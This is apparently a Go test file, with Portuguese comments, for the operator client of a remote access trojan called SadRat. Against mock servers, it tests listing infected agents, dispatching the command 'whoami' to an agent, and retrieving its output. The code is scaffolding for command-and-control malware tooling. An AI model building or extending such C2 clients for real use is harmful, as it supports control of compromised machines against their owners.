package tests

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	// O pacote que vamos criar na Fase Verde
	"github.com/VitorDie/SadRat/internal/client"
)

func TestClientHTTP_RequestAvailableAgents(t *testing.T) {
	// 1. Mock do C&C: Fingimos ser a API real que construímos anteriormente
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// O Cliente deve bater na rota exata de listar agentes com o método GET
		if r.URL.Path != "/api/agents" || r.Method != http.MethodGet {
			t.Fatalf("O Cliente tentou acessar %s %s, mas deveria ser GET /api/agents", r.Method, r.URL.Path)
		}
		
		// O C&C falso devolve dois agentes infectados em formato JSON
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`[{"id": "agent-alfa"}, {"id": "agent-omega"}]`))
	}))
	defer mockServer.Close()

	// 2. Especificação: Instanciamos a ferramenta do Operador através da Interface e do módulo HTTP
	// (Ainda vamos criar esse pacote na Fase Verde)
	// var operador client.Client = client.NewClientHTTP(mockServer.URL)

	// Como o pacote não existe ainda para o compilador, vamos simular a chamada direta para a Fase Red falhar por falta do pacote:
	operador := client.NewClientHTTP(mockServer.URL)

	// 3. Ação: O Operador executa o comando para ver os zumbis disponíveis
	agents, err := operador.RequestAvailableAgents()
	if err != nil {
		t.Fatalf("O Cliente falhou ao listar os agentes: %v", err)
	}

	// 4. Validação: O Cliente decodificou o JSON perfeitamente?
	if len(agents) != 2 {
		t.Fatalf("Esperava ver 2 agentes na lista, mas retornou %d", len(agents))
	}

	// SUBSTITUA A PALAVRA ZERO PELO NÚMERO 0 DENTRO DOS COLCHETES ABAIXO!
	if agents[0].ID != "agent-alfa" {
		t.Errorf("Esperava que o primeiro agente fosse o 'agent-alfa', mas foi '%s'", agents[0].ID)
	}
}

func TestClientHTTP_SendCommand(t *testing.T) {
	// 1. Mock do C&C: O Servidor Falso espera receber a ordem de ataque
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// O Cliente deve bater na rota de criar comandos com o método POST
		if r.URL.Path != "/api/jobs" || r.Method != http.MethodPost {
			t.Fatalf("O Cliente tentou acessar %s %s, mas deveria ser POST /api/jobs", r.Method, r.URL.Path)
		}

		// Valida se o Operador enviou o DTO corretamente
		var req map[string]interface{}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			t.Fatalf("O Cliente não enviou um JSON válido: %v", err)
		}

		if req["agent_id"] != "agent-alfa" || req["command"] != "whoami" {
			t.Errorf("O Cliente enviou os dados errados para o C&C: %+v", req)
		}

		// O C&C falso devolve o JSON do Job criado contendo o ID
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		w.Write([]byte(`{"id": "job-teste-123", "agent_id": "agent-alfa", "command": "whoami"}`))
	}))
	defer mockServer.Close()

	// 2. Especificação: Instanciamos a ferramenta do Operador
	operador := client.NewClientHTTP(mockServer.URL)

	// 3. Ação: O Operador despacha o comando mortal
	jobID, err := operador.SendCommand("whoami", []string{}, "agent-alfa")
	
	// 4. Validação: O Cliente retornou o ID do comando gerado pelo C&C?
	if err != nil {
		t.Fatalf("O Cliente falhou ao despachar o comando: %v", err)
	}

	if jobID != "job-teste-123" {
		t.Errorf("Esperava capturar o ID do comando 'job-teste-123', mas retornou '%s'", jobID)
	}
}

func TestClientHTTP_RequestJobResult(t *testing.T) {
	// 1. Mock do C&C: O Servidor Falso possui o resultado do Agente
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// O Cliente deve bater na rota de ler resultado com o método GET
		if r.URL.Path != "/api/jobs/job-123/result" || r.Method != http.MethodGet {
			t.Fatalf("O Cliente tentou acessar %s %s, mas deveria ser GET /api/jobs/job-123/result", r.Method, r.URL.Path)
		}

		// O C&C falso devolve o JSON do resultado
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"output": "root\n"}`))
	}))
	defer mockServer.Close()

	// 2. Especificação: Instanciamos a ferramenta do Operador
	operador := client.NewClientHTTP(mockServer.URL)

	// 3. Ação: O Operador busca a resposta do seu comando
	output, err := operador.RequestJobResult("job-123")
	
	// 4. Validação: O Cliente extraiu o output do JSON com sucesso?
	if err != nil {
		t.Fatalf("O Cliente falhou ao ler o resultado do comando: %v", err)
	}

	if output != "root\n" {
		t.Errorf("Esperava capturar a string 'root\\n', mas retornou '%s'", output)
	}
}